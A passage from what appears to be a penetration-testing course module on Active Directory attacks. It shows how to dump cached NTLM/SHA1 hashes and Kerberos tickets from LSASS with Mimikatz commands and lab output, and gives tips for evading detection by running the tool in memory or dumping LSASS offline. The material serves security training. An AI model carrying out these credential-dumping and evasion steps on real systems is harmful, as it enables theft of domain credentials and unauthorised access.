To lay the foundation for cached storage credential attacks, we must first discuss the various password hashes used with Kerberos and show how they are stored.

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.

If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.

Although this is the end goal of our AD attack, the process is not as straightforward as it sounds. Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.

Because of this, in order to target the stored hashes, we often have to start our attack with a local privilege escalation. To makes things even more tricky, the data structures used to store the hashes in memory are not publicly documented and they are also encrypted with an LSASS-stored key.

Nevertheless, since this is a huge attack vector against Windows and Active Directory, several tools have been created to extract the hashes, the most popular of which is Mimikatz.

Let's try to use Mimikatz to extract hashes on our Windows 10 system.

In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application. For example, execute Mimikatz directly from memory using an injector like PowerShell or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and from there, load the data into Mimikatz.

Since the Offsec domain user is a local administrator, we are able to launch a command prompt with elevated privileges. From this command prompt, we will run mimikatz and enter privilege::debug to engage the _SeDebugPrivlege_ privilege, which will allow us to interact with a process owned by another account.

Finally, we'll run sekurlsa::logonpasswords to dump the credentials of all logged-on users using the Sekurlsa module.

This should dump hashes for all users logged on to the current workstation or server, _including remote logins_ like Remote Desktop sessions.

```
C:\Tools\active_directory> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 291668 (00000000:00047354)
Session           : Interactive from 1
User Name         : Offsec
Domain            : CORP
Logon Server      : DC01
Logon Time        : 08/02/2018 14.23.26
SID               : S-1-5-21-1602875587-2787523311-2599479668-1103
        msv :
         [00000003] Primary
         \* Username : Offsec
         \* Domain   : CORP
         \* NTLM     : e2b475c11da2a0748290d87aa966c327
         \* SHA1     : 8c77f430e4ab8acb10ead387d64011c76400d26e
         \* DPAPI    : 162d313bede93b0a2e72a030ec9210f0
        tspkg :
        wdigest :
         \* Username : Offsec
         \* Domain   : CORP
         \* Password : (null)
        kerberos :
         \* Username : Offsec
         \* Domain   : CORP.COM
         \* Password : (null)
...
```

The output snippet above shows all credential information stored in LSASS for the domain user Offsec, including cached hashes.

Notice that we have two types of hashes highlighted in the output above. This will vary based on the functional level of the AD implementation. For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, WDigest,[9](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-authentication/cached-credential-storage-and-retrieval#fn9) will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext password alongside the password hashes.

Armed with these hashes, we could attempt to crack them and obtain the cleartext password.

A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS and we can use Mimikatz to interact with and retrieve our own tickets and the tickets of other local users.

For example, in Listing 30, we use Mimikatz to show the Offsec user's tickets that are stored in memory:

```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 291668 (00000000:00047354)
Session           : Interactive from 1
User Name         : Offsec
Domain            : CORP
Logon Server      : DC01
Logon Time        : 08/02/2018 14.23.26
SID               : S-1-5-21-1602875587-2787523311-2599479668-1103

 * Username : Offsec
 * Domain   : CORP.COM
 * Password : (null)

Group 0 - Ticket Granting Service
 [00000000]
   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
   Service Name (02) : cifs ; dc01 ; @ CORP.COM
   Target Name  (02) : cifs ; dc01 ; @ CORP.COM
   Client Name  (01) : Offsec ; @ CORP.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
   Session Key       : 0x00000012 - aes256_hmac
     d062a1b8c909544a7130652fd4bae4c04833c3324aa2eb1d051816a7090a0718
   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

Group 1 - Client Ticket ?

Group 2 - Ticket Granting Ticket
 [00000000]
   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
   Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
   Target Name  (--) : @ CORP.COM
   Client Name  (01) : Offsec ; @ CORP.COM ( $$Delegation Ticket$$ )
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwa
   Session Key       : 0x00000012 - aes256_hmac
     3b0a49af17a1ada1dacf2e3b8964ad397d80270b71718cc567da4d4b2b6dc90d
   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
 [00000001]
   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
   Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
   Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
   Client Name  (01) : Offsec ; @ CORP.COM ( CORP.COM )
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forward
   Session Key       : 0x00000012 - aes256_hmac
     8f6e96a7067a86d94af4e9f46e0e2abd067422fe7b1588db37c199f5691a749c
   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```

> Listing 30 - Extracting Kerberos tickets with mimikatz

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain. We will discuss how to leverage stolen or forged tickets later on in the module.

In addition to these functions, Mimikatz can also export tickets to the hard drive and import tickets into LSASS, which we will explore later. Mimikatz can even extract information related to authentication performed through smart card and PIN, making this tool a real cached credential "Swiss Army knife"!